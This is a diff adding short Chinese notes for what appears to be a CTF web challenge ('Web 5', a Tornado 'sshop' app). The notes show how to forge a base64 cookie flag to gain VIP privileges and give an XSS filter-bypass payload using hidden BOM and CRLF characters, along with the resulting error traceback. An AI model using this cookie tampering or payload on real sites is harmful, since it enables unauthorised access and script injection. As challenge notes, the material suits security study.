@@ -1,0 +1,33 @@
+Web 5 信息收集：
+
+
+改Cookie获取VIP权限。
+
+把 isvip 中如下的部分
+
+|5:isvip|4:MA==
+
+改成
+
+|5:isvip|4:MQ==
+
+
+修改资料过滤：
+
+ ' script
+
+bio=<scrip%EF%BB%BFt>alert("123")</scrip%0D%0At>
+
+发现报错堆栈
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 1541, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "/usr/local/lib/python2.7/dist-packages/tornado/web.py", line 2949, in wrapper
+    return method(self, *args, **kwargs)
+  File "/home/ciscn/sshop/views/User.py", line 124, in post
+    f.write(bio)
+UnicodeEncodeError: 'ascii' codec can't encode character u'\ufeff' in position 6: ordinal not in range(128)
+
+存在写文件操作。
+
+
